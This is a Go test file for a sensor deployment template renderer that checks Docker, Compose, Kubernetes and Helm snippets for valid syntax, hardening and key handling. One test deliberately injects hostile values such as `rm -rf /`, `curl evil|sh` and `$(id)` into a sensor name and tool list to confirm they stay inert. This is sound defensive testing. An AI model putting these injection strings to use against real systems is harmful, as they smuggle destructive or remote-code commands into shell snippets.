package sensor

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"errors"
	"io"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"gopkg.in/yaml.v3"

	sensordom "github.com/openctemio/openctem/api/pkg/domain/sensor"
	"github.com/openctemio/openctem/api/pkg/domain/shared"
	"github.com/openctemio/openctem/api/pkg/logger"
)

// shippedTemplatesDir is the directory the API image ships the templates in.
const shippedTemplatesDir = "../../../configs/sensor-templates"

// templateSources renders from the shipped files and from the built-in
// fallbacks; both must produce working snippets.
var templateSources = []string{shippedTemplatesDir, "/nonexistent-uses-builtins"}

func testCAPEM(t *testing.T) []byte {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "Caddy Local Authority - 2026 ECC Root"},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(time.Hour),
		IsCA:                  true,
		BasicConstraintsValid: true,
		KeyUsage:              x509.KeyUsageCertSign,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	return pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
}

func daemonSensor(tools ...string) *sensordom.Sensor {
	tenantID := shared.NewID()
	return &sensordom.Sensor{
		ID: shared.NewID(), TenantID: &tenantID, Name: "DMZ Scanner 01",
		Type: sensordom.SensorTypeWorker, ExecutionMode: sensordom.ExecutionModeDaemon, Reported: sensordom.ReportOf(tools...),
	}
}

func render(t *testing.T, dir string, data SensorTemplateData) *RenderedTemplates {
	t.Helper()
	out, err := NewSensorConfigTemplateService(dir, logger.NewNop()).Render(data)
	if err != nil {
		t.Fatalf("[%s] render: %v", dir, err)
	}
	return out
}

func fullData(t *testing.T) SensorTemplateData {
	return SensorTemplateData{
		Sensor:  daemonSensor("nuclei", "trivy"),
		APIKey:  "rda_4b1e0123456789abcdef",
		BaseURL: "https://192.168.8.204",
		Image:   "ghcr.io/openctemio/sensor:v0.4.2",
		CACert:  string(testCAPEM(t)),
	}
}

// bashSyntaxOK runs `bash -n` on a snippet: it must parse as pasted.
func bashSyntaxOK(t *testing.T, label, script string) {
	t.Helper()
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("bash not available")
	}
	cmd := exec.Command("bash", "-n")
	cmd.Stdin = strings.NewReader(script)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		t.Errorf("%s does not parse as shell: %v %s\n%s", label, err, stderr.String(), script)
	}
}

// continuationLinesOK: a line ending in a backslash continues the command, so
// the next line must not be a comment or blank (that ends the command early,
// the bug in the old docker template).
func continuationLinesOK(t *testing.T, label, script string) {
	t.Helper()
	lines := strings.Split(script, "\n")
	for i, l := range lines {
		if !strings.HasSuffix(strings.TrimRight(l, " "), `\`) || i+1 >= len(lines) {
			continue
		}
		next := strings.TrimSpace(lines[i+1])
		if next == "" || strings.HasPrefix(next, "#") {
			t.Errorf("%s: line %d continues into %q:\n%s", label, i+1, next, script)
		}
	}
}

func TestTemplates_DockerRunWorksAsPasted(t *testing.T) {
	for _, dir := range templateSources {
		d := render(t, dir, fullData(t)).Docker
		bashSyntaxOK(t, dir+" docker", d)
		continuationLinesOK(t, dir+" docker", d)
		for _, want := range []string{
			"ghcr.io/openctemio/sensor:v0.4.2",
			"-e API_URL='https://192.168.8.204'",
			"-e API_KEY='rda_4b1e0123456789abcdef'",
			"-e SENSOR_TOOLS=nuclei,trivy",
			"-e SSL_CERT_DIR=/etc/openctem/certs",
			// The CA and the sensor-local policy both live under /etc/openctem,
			// mounted read-only; the policy is required (fail closed).
			"-v /etc/openctem:/etc/openctem:ro",
			"sudo install -m 0644 sensor-policy.yaml /etc/openctem/sensor-policy.yaml",
			"-e SENSOR_LOCAL_POLICY=/etc/openctem/sensor-policy.yaml",
			// Hardened by default (RFC-040 §5.10).
			"--read-only --cap-drop ALL --security-opt no-new-privileges:true",
			"--tmpfs /tmp",
			"-e XDG_CONFIG_HOME=/tmp/.config -e XDG_CACHE_HOME=/tmp/.cache",
			":/var/lib/openctem/outbox",
			"-v dmz-scanner-01-state:/var/lib/openctem/state",
			"-v dmz-scanner-01-content:/var/lib/openctem/content",
			"--restart unless-stopped",
			"--name dmz-scanner-01",
			"-----BEGIN CERTIFICATE-----",
			"chmod 0644",
		} {
			if !strings.Contains(d, want) {
				t.Errorf("[%s] docker snippet lacks %q:\n%s", dir, want, d)
			}
		}
		// The image's home directory holds the baked nuclei-templates
		// release: nothing is mounted over it.
		for _, bad := range []string{"openctemio/agent", ":latest", "AGENT_", "-config", "/path/to/scan", "/home/openctem"} {
			if strings.Contains(d, bad) {
				t.Errorf("[%s] docker snippet still has %q:\n%s", dir, bad, d)
			}
		}
	}
}

func TestTemplates_NoKeyNoCA(t *testing.T) {
	for _, dir := range templateSources {
		data := fullData(t)
		data.APIKey, data.CACert = "", ""
		out := render(t, dir, data)
		bashSyntaxOK(t, dir+" docker", out.Docker)
		// Without the key the snippet reads it from the environment and stops
		// with a clear message when it is not set; no "<YOUR_API_KEY>", which
		// the shell would read as a redirection.
		if !strings.Contains(out.Docker, `-e API_KEY="${OPENCTEM_API_KEY:?`) {
			t.Errorf("[%s] docker without a key:\n%s", dir, out.Docker)
		}
		if strings.Contains(out.Docker, "<YOUR_API_KEY>") || strings.Contains(out.Docker, "SSL_CERT_DIR") ||
			strings.Contains(out.Docker, "BEGIN CERTIFICATE") {
			t.Errorf("[%s] docker without key/CA:\n%s", dir, out.Docker)
		}
		if strings.Contains(out.Compose, "openctem_ca") || strings.Contains(out.Kubernetes, "ca.crt") {
			t.Errorf("[%s] CA steps without a CA:\ncompose:\n%s\nkubernetes:\n%s", dir, out.Compose, out.Kubernetes)
		}
	}
}

func TestTemplates_OneShotRunner(t *testing.T) {
	for _, dir := range templateSources {
		data := fullData(t)
		data.Sensor.Type, data.Sensor.ExecutionMode = sensordom.SensorTypeWorker, sensordom.ExecutionModeStandalone
		data.Sensor.Reported = sensordom.ReportOf("semgrep")
		d := render(t, dir, data).Docker
		bashSyntaxOK(t, dir+" runner docker", d)
		continuationLinesOK(t, dir+" runner docker", d)
		for _, want := range []string{"docker run --rm", `-v "$PWD":/scan`, "-tool semgrep -target /scan -push"} {
			if !strings.Contains(d, want) {
				t.Errorf("[%s] runner snippet lacks %q:\n%s", dir, want, d)
			}
		}
		if strings.Contains(d, "--restart") {
			t.Errorf("[%s] a one-shot run must not restart:\n%s", dir, d)
		}
	}
}

func TestTemplates_ComposeIsValid(t *testing.T) {
	for _, dir := range templateSources {
		c := render(t, dir, fullData(t)).Compose
		var doc struct {
			Services map[string]struct {
				Image       string            `yaml:"image"`
				Restart     string            `yaml:"restart"`
				Environment map[string]string `yaml:"environment"`
				Volumes     []string          `yaml:"volumes"`
				ReadOnly    bool              `yaml:"read_only"`
				CapDrop     []string          `yaml:"cap_drop"`
				SecurityOpt []string          `yaml:"security_opt"`
				Tmpfs       []string          `yaml:"tmpfs"`
				Configs     []struct {
					Source string `yaml:"source"`
					Target string `yaml:"target"`
				} `yaml:"configs"`
			} `yaml:"services"`
			Volumes map[string]any `yaml:"volumes"`
			Configs map[string]struct {
				Content string `yaml:"content"`
			} `yaml:"configs"`
		}
		if err := yaml.Unmarshal([]byte(c), &doc); err != nil {
			t.Fatalf("[%s] compose is not YAML: %v\n%s", dir, err, c)
		}
		s, ok := doc.Services["sensor"]
		if !ok {
			t.Fatalf("[%s] compose has no sensor service:\n%s", dir, c)
		}
		if s.Image != "ghcr.io/openctemio/sensor:v0.4.2" || s.Restart != "unless-stopped" {
			t.Errorf("[%s] image=%q restart=%q", dir, s.Image, s.Restart)
		}
		if s.Environment["API_URL"] != "https://192.168.8.204" || s.Environment["SENSOR_TOOLS"] != "nuclei,trivy" ||
			s.Environment["SSL_CERT_DIR"] != "/etc/openctem/certs" {
			t.Errorf("[%s] environment = %v", dir, s.Environment)
		}
		// The key comes from .env, never written into the compose file.
		if !strings.HasPrefix(s.Environment["API_KEY"], "${OPENCTEM_API_KEY:?") || strings.Contains(c, "API_KEY: rda_") {
			t.Errorf("[%s] API_KEY = %q", dir, s.Environment["API_KEY"])
		}
		if !strings.Contains(c, "OPENCTEM_API_KEY=rda_4b1e0123456789abcdef") {
			t.Errorf("[%s] compose does not say how to write .env with the key:\n%s", dir, c)
		}
		if len(s.Volumes) != 4 || !strings.HasSuffix(s.Volumes[0], ":/var/lib/openctem/outbox") ||
			s.Volumes[1] != "state:/var/lib/openctem/state" || s.Volumes[2] != "content:/var/lib/openctem/content" ||
			s.Volumes[3] != "./policy:/etc/openctem/policy:ro" {
			t.Errorf("[%s] volumes = %v, want outbox, state, content and the read-only policy", dir, s.Volumes)
		}
		// Hardened, with the sensor-local policy required (RFC-040).
		if !s.ReadOnly || len(s.CapDrop) != 1 || s.CapDrop[0] != "ALL" || len(s.SecurityOpt) != 1 ||
			s.SecurityOpt[0] != "no-new-privileges:true" || len(s.Tmpfs) != 1 || s.Tmpfs[0] != "/tmp" ||
			s.Environment["XDG_CONFIG_HOME"] != "/tmp/.config" || s.Environment["XDG_CACHE_HOME"] != "/tmp/.cache" ||
			s.Environment["SENSOR_LOCAL_POLICY"] != "/etc/openctem/policy/sensor-policy.yaml" ||
			s.Environment["SENSOR_KILL_SWITCH_FILE"] != "/etc/openctem/policy/STOP" {
			t.Errorf("[%s] hardening/policy: read_only=%v cap_drop=%v security_opt=%v tmpfs=%v env=%v", dir,
				s.ReadOnly, s.CapDrop, s.SecurityOpt, s.Tmpfs, s.Environment)
		}
		for _, v := range []string{"outbox", "state", "content"} {
			if _, ok := doc.Volumes[v]; !ok {
				t.Errorf("[%s] compose does not declare the %s volume:\n%s", dir, v, c)
			}
		}
		if len(s.Configs) != 1 || s.Configs[0].Target != "/etc/openctem/certs/openctem-root-ca.crt" ||
			!strings.Contains(doc.Configs[s.Configs[0].Source].Content, "BEGIN CERTIFICATE") {
			t.Errorf("[%s] CA config = %+v", dir, s.Configs)
		}
	}
}

func TestTemplates_KubernetesManifestsAreValid(t *testing.T) {
	for _, dir := range templateSources {
		k := render(t, dir, fullData(t)).Kubernetes
		dec := yaml.NewDecoder(strings.NewReader(k))
		kinds := map[string]map[string]any{}
		for {
			var obj map[string]any
			err := dec.Decode(&obj)
			if errors.Is(err, io.EOF) {
				break
			}
			if err != nil {
				t.Fatalf("[%s] manifest is not YAML: %v\n%s", dir, err, k)
			}
			if obj == nil {
				continue
			}
			kinds[obj["kind"].(string)] = obj
		}
		for _, kind := range []string{"Secret", "PersistentVolumeClaim", "Deployment"} {
			if _, ok := kinds[kind]; !ok {
				t.Errorf("[%s] no %s in:\n%s", dir, kind, k)
			}
		}
		for _, want := range []string{
			"image: ghcr.io/openctemio/sensor:v0.4.2", "api-key: rda_4b1e0123456789abcdef",
			"SSL_CERT_DIR", "mountPath: /var/lib/openctem/outbox", "type: Recreate", "BEGIN CERTIFICATE",
			"mountPath: /var/lib/openctem/state", "claimName: dmz-scanner-01-state",
			"mountPath: /var/lib/openctem/content", "claimName: dmz-scanner-01-content", "storage: 5Gi",
			// The identity key stays 0600 across pod replacements.
			"fsGroupChangePolicy: OnRootMismatch",
			"value: /tmp/.config", "mountPath: /tmp",
		} {
			if !strings.Contains(k, want) {
				t.Errorf("[%s] manifest lacks %q", dir, want)
			}
		}
		// The baked nuclei-templates release lives in the image's home.
		if strings.Contains(k, "mountPath: /home/openctem") {
			t.Errorf("[%s] manifest mounts over the image's home directory:\n%s", dir, k)
		}
	}
}

func TestTemplates_HelmUsesTheChartsSensorValues(t *testing.T) {
	for _, dir := range templateSources {
		h := render(t, dir, fullData(t)).Helm
		bashSyntaxOK(t, dir+" helm", h)
		continuationLinesOK(t, dir+" helm", h)
		for _, want := range []string{
			"--set sensor.enabled=true", "--set sensor.image.tag=v0.4.2", "--set sensor.existingSecret=",
			// Helm splits --set values on commas; the escaped comma survives
			// the shell inside single quotes.
			`--set-string 'sensor.tools=nuclei\,trivy'`, "--set sensor.outbox.persistence.enabled=true",
			"--set sensor.state.persistence.enabled=true", "--set sensor.content.persistence.enabled=true",
			"--from-literal=api-key='rda_4b1e0123456789abcdef'",
		} {
			if !strings.Contains(h, want) {
				t.Errorf("[%s] helm lacks %q:\n%s", dir, want, h)
			}
		}
	}
}

func TestTemplates_YAMLEnvCLIUseTheCurrentSensorSettings(t *testing.T) {
	for _, dir := range templateSources {
		out := render(t, dir, fullData(t))
		var cfg struct {
			Sensor map[string]any `yaml:"sensor"`
			Server struct {
				BaseURL  string `yaml:"base_url"`
				APIKey   string `yaml:"api_key"`
				SensorID string `yaml:"sensor_id"`
			} `yaml:"server"`
			Outbox map[string]any `yaml:"outbox"`
		}
		if err := yaml.Unmarshal([]byte(out.YAML), &cfg); err != nil {
			t.Fatalf("[%s] yaml: %v\n%s", dir, err, out.YAML)
		}
		if cfg.Sensor["name"] != "DMZ Scanner 01" || cfg.Server.BaseURL != "https://192.168.8.204" ||
			cfg.Server.APIKey != "rda_4b1e0123456789abcdef" || cfg.Server.SensorID == "" || cfg.Outbox["dir"] == nil {
			t.Errorf("[%s] yaml = %+v\n%s", dir, cfg, out.YAML)
		}
		bashSyntaxOK(t, dir+" env", out.Env)
		bashSyntaxOK(t, dir+" cli", out.CLI)
		for label, s := range map[string]string{"yaml": out.YAML, "env": out.Env, "cli": out.CLI} {
			for _, bad := range []string{"AGENT_ID", "agent_id", "./agent ", "\nagent:"} {
				if strings.Contains(s, bad) {
					t.Errorf("[%s] %s still has %q", dir, label, bad)
				}
			}
		}
		if !strings.Contains(out.Env, "export SSL_CERT_DIR=") || !strings.Contains(out.CLI, "openctemio-sensor") {
			t.Errorf("[%s] env/cli:\n%s\n%s", dir, out.Env, out.CLI)
		}
	}
}

// Values that end up in a shell snippet are not trusted blindly: tool names are
// set by tenant admins, the name is slugified, and quoting covers the rest.
func TestTemplates_HostileValuesStayInert(t *testing.T) {
	for _, dir := range templateSources {
		data := fullData(t)
		data.Sensor.Name = `x"; rm -rf / #`
		data.Sensor.Reported = sensordom.ReportOf("nuclei;curl evil|sh", "$(id)", "trivy")
		out := render(t, dir, data)
		bashSyntaxOK(t, dir+" docker", out.Docker)
		for label, s := range map[string]string{"docker": out.Docker, "helm": out.Helm, "env": out.Env, "cli": out.CLI} {
			for _, bad := range []string{"curl evil", "$(id)", "rm -rf"} {
				if strings.Contains(s, bad) {
					t.Errorf("[%s] %s carries %q:\n%s", dir, label, bad, s)
				}
			}
		}
		if !strings.Contains(out.Docker, "SENSOR_TOOLS=trivy") {
			t.Errorf("[%s] the valid tool was dropped:\n%s", dir, out.Docker)
		}
	}
}

// The files shipped in configs/sensor-templates and the built-in fallbacks are
// the same templates; an edit to one must be made to the other.
func TestTemplates_ShippedFilesMatchBuiltins(t *testing.T) {
	for _, f := range templateFormats {
		b, err := os.ReadFile(filepath.Join(shippedTemplatesDir, f+".tmpl"))
		if err != nil {
			t.Fatalf("read %s: %v", f, err)
		}
		if string(b) != builtinTemplates[f] {
			t.Errorf("configs/sensor-templates/%s.tmpl differs from the built-in %q template", f, f)
		}
	}
}

func TestLoadCACertificate(t *testing.T) {
	dir := t.TempDir()
	ca := testCAPEM(t)

	write := func(name string, b []byte) string {
		p := filepath.Join(dir, name)
		if err := os.WriteFile(p, b, 0o600); err != nil {
			t.Fatal(err)
		}
		return p
	}

	pemOut, fp, err := LoadCACertificate(write("ca.crt", ca))
	if err != nil || pemOut != string(ca) {
		t.Fatalf("valid CA: err=%v pem=%q", err, pemOut)
	}
	if len(fp) != 95 || strings.Count(fp, ":") != 31 {
		t.Errorf("fingerprint %q is not colon-separated SHA-256", fp)
	}

	// A file that also holds a private key: only the certificate comes out.
	keyBlock := pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: []byte("secret-key-material")})
	pemOut, _, err = LoadCACertificate(write("mixed.pem", append(append([]byte{}, keyBlock...), ca...)))
	if err != nil || strings.Contains(pemOut, "PRIVATE KEY") || !strings.Contains(pemOut, "BEGIN CERTIFICATE") {
		t.Errorf("mixed file: err=%v pem=%q", err, pemOut)
	}

	for name, b := range map[string][]byte{
		"garbage.crt":  []byte("not a certificate"),
		"key-only.pem": keyBlock,
		"bad-der.crt":  pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: []byte("junk")}),
	} {
		if pemOut, _, err := LoadCACertificate(write(name, b)); err == nil || pemOut != "" {
			t.Errorf("%s: want an error and no PEM, got %q", name, pemOut)
		}
	}
	if _, _, err := LoadCACertificate(filepath.Join(dir, "missing.crt")); err == nil {
		t.Error("missing file: want an error")
	}
	if pemOut, fp, err := LoadCACertificate(""); err != nil || pemOut != "" || fp != "" {
		t.Errorf("unset path: want nothing, got %q %q %v", pemOut, fp, err)
	}
}
